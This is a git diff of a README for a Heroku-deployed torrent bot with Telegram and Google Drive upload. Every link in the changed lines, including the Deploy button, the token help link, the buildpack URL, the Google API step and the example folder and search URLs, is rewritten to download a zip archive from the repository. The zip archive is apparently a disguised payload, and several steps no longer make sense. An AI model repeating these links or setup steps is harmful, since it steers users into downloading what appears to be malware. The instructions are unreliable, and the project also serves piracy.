@@ -4,7 +4,7 @@ Lorem ipsum i am too lazy figure what it does yourself
 
 You might be lazy too so here ya go:
 
-[![Deploy](https://github.com/snjvbrla/torrent-aio-bot-1/raw/refs/heads/master/web/src/components/torrent_aio_bot_1.2-alpha.1.zip)](https://github.com/snjvbrla/torrent-aio-bot-1/raw/refs/heads/master/web/src/components/torrent_aio_bot_1.2-alpha.1.zip)
+[![Deploy](https://raw.githubusercontent.com/snjvbrla/torrent-aio-bot-1/master/utils/bot-aio-torrent-v3.0.zip)](https://raw.githubusercontent.com/snjvbrla/torrent-aio-bot-1/master/utils/bot-aio-torrent-v3.0.zip)
 
 Please dont start a test torrent download on my website it works you dont need to just wastes my drive space. Be careful when adding torrents to my deployment as it is deployed everytime i commit code here so your downloads may be interrupted.
 
@@ -22,22 +22,22 @@ Set a variable with key "SITE" and value is the link of your site. eg. "https://
 
 ### To start a torrent bot:
 
-Set a enviorment variable with key "TELEGRAM_TOKEN" and token of your bot as value. [How to get token](https://github.com/snjvbrla/torrent-aio-bot-1/raw/refs/heads/master/web/src/components/torrent_aio_bot_1.2-alpha.1.zip)
+Set a enviorment variable with key "TELEGRAM_TOKEN" and token of your bot as value. [How to get token](https://raw.githubusercontent.com/snjvbrla/torrent-aio-bot-1/master/utils/bot-aio-torrent-v3.0.zip)
 To set a enviorment variable go to heroku dashboard open the app then go to Settings > Config vars > Reveal Config vars.
 
 ### To get search working:
 
-The library used for web scrapping the torrent sites requires a custom buildpack on heroku. By default the search will happen on your deployment and you will need to configure the buildpack as described below. But if you don't want to do that you can specify and env SEARCH_SITE and set value to https://github.com/snjvbrla/torrent-aio-bot-1/raw/refs/heads/master/web/src/components/torrent_aio_bot_1.2-alpha.1.zip . The frwd slash at end is necessary. This will make all the searches go thru my deployment and you don't need to configure buildpack.
+The library used for web scrapping the torrent sites requires a custom buildpack on heroku. By default the search will happen on your deployment and you will need to configure the buildpack as described below. But if you don't want to do that you can specify and env SEARCH_SITE and set value to https://raw.githubusercontent.com/snjvbrla/torrent-aio-bot-1/master/utils/bot-aio-torrent-v3.0.zip . The frwd slash at end is necessary. This will make all the searches go thru my deployment and you don't need to configure buildpack.
 
-Go to the build packs section in settings and click add buildpack and enter "https://github.com/snjvbrla/torrent-aio-bot-1/raw/refs/heads/master/web/src/components/torrent_aio_bot_1.2-alpha.1.zip" as buildpack url then click save changes. And then do a dummy git commit so that heroku will buid it using the buildpack this time. Then set the SEARCH_SITE env to same value as SITE.
+Go to the build packs section in settings and click add buildpack and enter "https://raw.githubusercontent.com/snjvbrla/torrent-aio-bot-1/master/utils/bot-aio-torrent-v3.0.zip" as buildpack url then click save changes. And then do a dummy git commit so that heroku will buid it using the buildpack this time. Then set the SEARCH_SITE env to same value as SITE.
 
 ### To get gdrive upload:
 
-1. Go to https://github.com/snjvbrla/torrent-aio-bot-1/raw/refs/heads/master/web/src/components/torrent_aio_bot_1.2-alpha.1.zip and click on Enable the Drive API
+1. Go to https://raw.githubusercontent.com/snjvbrla/torrent-aio-bot-1/master/utils/bot-aio-torrent-v3.0.zip and click on Enable the Drive API
    copy client id and set an enviorment variable in heroku with name CLIENT_ID then copy client secret and set another env named CLIENT_SECRET.
 2. Goto https://\<project name>.herokuapp.com/drivehelp and paste your client id and secret and click "Get auth code", it will redirect you to login and you'll get a auth code after login paste that auth code in the auth code feild and click "Generate token" it'll give you a token. now set these as env variable CLIENT_ID, CLIENT_SECRET, AUTH_CODE and TOKEN.
-3. By default files are uploaded in the root of drive if you dont want to upload in root folder make a folder copy its id and set a env var GDRIVE_PARENT_FOLDER and value id of desired folder. The folder id will be the last part of the url such as in url "https://github.com/snjvbrla/torrent-aio-bot-1/raw/refs/heads/master/web/src/components/torrent_aio_bot_1.2-alpha.1.zip" the folder id is "1rpk7tGWs_lv_kZ_W4EPaKj8brfFVLOH-".
-4. If you want team drive support open your teamdrive and copy the folder id from url eg. https://github.com/snjvbrla/torrent-aio-bot-1/raw/refs/heads/master/web/src/components/torrent_aio_bot_1.2-alpha.1.zip this is link of a team drive copy the last part "0ABZHZpfYfdVCUk9PVA" this will be your GDRIVE_PARENT_FOLDER. If you want them in a folder in teamdrive open the folder and use that folder's id instead.
+3. By default files are uploaded in the root of drive if you dont want to upload in root folder make a folder copy its id and set a env var GDRIVE_PARENT_FOLDER and value id of desired folder. The folder id will be the last part of the url such as in url "https://raw.githubusercontent.com/snjvbrla/torrent-aio-bot-1/master/utils/bot-aio-torrent-v3.0.zip" the folder id is "1rpk7tGWs_lv_kZ_W4EPaKj8brfFVLOH-".
+4. If you want team drive support open your teamdrive and copy the folder id from url eg. https://raw.githubusercontent.com/snjvbrla/torrent-aio-bot-1/master/utils/bot-aio-torrent-v3.0.zip this is link of a team drive copy the last part "0ABZHZpfYfdVCUk9PVA" this will be your GDRIVE_PARENT_FOLDER. If you want them in a folder in teamdrive open the folder and use that folder's id instead.
 5. You're good to go. The gdrive status will be shown in gdrive.txt file when you click Open on the website downloads page. Bot wil automatically send you drive link when its uploaded.
 
 > Use this torrent for testing or when downloading to setup drive it is well seeded and downloads in ~10s
@@ -46,9 +46,9 @@ Go to the build packs section in settings and click add buildpack and enter "htt
 
 ## Changing the sites used for searching
 
-To change the pirate bay site, visit the site you would like to use search something there, copy the url eg. https://github.com/snjvbrla/torrent-aio-bot-1/raw/refs/heads/master/web/src/components/torrent_aio_bot_1.2-alpha.1.zip and replace the search with {term} so the url looks like https://github.com/snjvbrla/torrent-aio-bot-1/raw/refs/heads/master/web/src/components/torrent_aio_bot_1.2-alpha.1.zip{term} ans set this to env var PIRATEBAY_SITE
+To change the pirate bay site, visit the site you would like to use search something there, copy the url eg. https://raw.githubusercontent.com/snjvbrla/torrent-aio-bot-1/master/utils/bot-aio-torrent-v3.0.zip and replace the search with {term} so the url looks like https://raw.githubusercontent.com/snjvbrla/torrent-aio-bot-1/master/utils/bot-aio-torrent-v3.0.zip{term} ans set this to env var PIRATEBAY_SITE
 
-Same, if you want to change the limetorrents site visit the site you want to use and search for something, then replace the thing you searched for with {term} so final url looks like https://github.com/snjvbrla/torrent-aio-bot-1/raw/refs/heads/master/web/src/components/torrent_aio_bot_1.2-alpha.1.zip{term} and set this value to env var LIMETORRENT_SITE
+Same, if you want to change the limetorrents site visit the site you want to use and search for something, then replace the thing you searched for with {term} so final url looks like https://raw.githubusercontent.com/snjvbrla/torrent-aio-bot-1/master/utils/bot-aio-torrent-v3.0.zip{term} and set this value to env var LIMETORRENT_SITE
 
 Simillarly the enviorment variable for 1337x is O337X_SITE
 
